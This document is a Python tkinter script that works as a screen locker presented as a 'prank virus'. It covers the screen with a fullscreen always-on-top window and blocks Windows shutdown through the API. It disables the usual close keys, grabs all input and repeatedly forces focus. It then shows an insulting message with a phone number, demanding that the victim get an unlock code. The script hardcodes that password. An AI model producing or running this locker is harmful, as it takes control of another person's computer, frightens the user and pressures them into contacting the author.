import tkinter as tk
import time
import sys
import ctypes
from ctypes import wintypes

PASSWORD = "mega-hayrulla-password-122-33-3345"
IS_WINDOWS = sys.platform == "win32"

# --- Windows API: блокировка выключения ---
if IS_WINDOWS:
    user32 = ctypes.windll.user32
    user32.ShutdownBlockReasonCreate.argtypes = [wintypes.HWND, wintypes.LPCWSTR]
    user32.ShutdownBlockReasonCreate.restype = wintypes.BOOL
    user32.ShutdownBlockReasonDestroy.argtypes = [wintypes.HWND]
    user32.ShutdownBlockReasonDestroy.restype = wintypes.BOOL

    def block_shutdown(hwnd, reason="Prank in progress..."):
        try:
            user32.ShutdownBlockReasonCreate(hwnd, reason)
        except Exception:
            pass

    def unblock_shutdown(hwnd):
        try:
            user32.ShutdownBlockReasonDestroy(hwnd)
        except Exception:
            pass
else:
    def block_shutdown(hwnd, reason=""):
        pass

    def unblock_shutdown(hwnd):
        pass


def create_prank_window():
    root = tk.Tk()
    root.title("Timer")

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    root.overrideredirect(True)
    root.geometry(f"{screen_width}x{screen_height}+0+0")
    root.attributes("-topmost", True)
    root.configure(bg="black")

    # Получаем HWND и включаем блокировку выключения
    root.update_idletasks()
    hwnd = root.winfo_id()
    block_shutdown(hwnd, "Prank in progress. Don't turn me off :)")

    container = tk.Frame(root, bg="black")
    container.pack(expand=True, fill="both")

    timer_label = tk.Label(
        container, text="25.0",
        font=("Arial", 140, "bold"),
        fg="red", bg="black"
    )
    timer_label.pack(expand=True)

    prank_frame = tk.Frame(container, bg="black")

    prank_text = (
        'Привет Лошара :) как я вижу ты получил мой вирус да? '
        'напиши мне опять на номер 7 988 904 41-30 я отвечу и дам код :)'
    )
    prank_label = tk.Label(
        prank_frame, text=prank_text,
        font=("Arial", 40, "bold"),
        fg="red", bg="black",
        wraplength=screen_width - 100,
        justify="center"
    )
    prank_label.pack(expand=True, pady=(0, 40))

    entry = tk.Entry(
        prank_frame, font=("Arial", 32), width=40,
        justify="center", bg="black", fg="red",
        insertbackground="red"
    )
    entry.pack(pady=(0, 60))

    hint_label = tk.Label(
        prank_frame, text="",
        font=("Arial", 20), fg="red", bg="black"
    )
    hint_label.pack()

    # --- Блокировки закрытия ---
    root.grab_set_global()

    for seq in ("<Alt-F4>", "<Escape>", "<Control-w>", "<Control-W>",
                "<Alt-Escape>", "<Super_L>", "<F4>"):
        root.bind_all(seq, lambda e: "break")

    def keep_focus():
        try:
            root.lift()
            root.attributes("-topmost", True)
            root.focus_force()
        except tk.TclError:
            pass
        root.after(200, keep_focus)

    # --- Логика таймера ---
    start_time = time.time()
    duration = 25.0
    zero_hold = 2.0

    def show_prank():
        timer_label.pack_forget()
        prank_frame.pack(expand=True, fill="both")
        entry.focus_force()

    def update_timer():
        elapsed = time.time() - start_time
        remaining = duration - elapsed

        if remaining > 0:
            timer_label.config(text=f"{remaining:.1f}")
            root.after(50, update_timer)
        else:
            timer_label.config(text="0.0")
            root.after(int(zero_hold * 1000), show_prank)

    # --- Проверка пароля ---
    def check_password(event=None):
        if entry.get() == PASSWORD:
            unblock_shutdown(hwnd)
            try:
                root.grab_release()
            except tk.TclError:
                pass
            root.destroy()
        else:
            hint_label.config(text="Wrong password :( try again")
            entry.delete(0, tk.END)

    entry.bind("<Return>", check_password)

    # Единая точка закрытия — снимает блокировку выключения
    def on_close():
        unblock_shutdown(hwnd)
        try:
            root.grab_release()
        except tk.TclError:
            pass
        root.destroy()

    root.protocol("WM_DELETE_WINDOW", on_close)

    root.focus_force()
    keep_focus()
    update_timer()
    root.mainloop()


if __name__ == "__main__":
    create_prank_window()
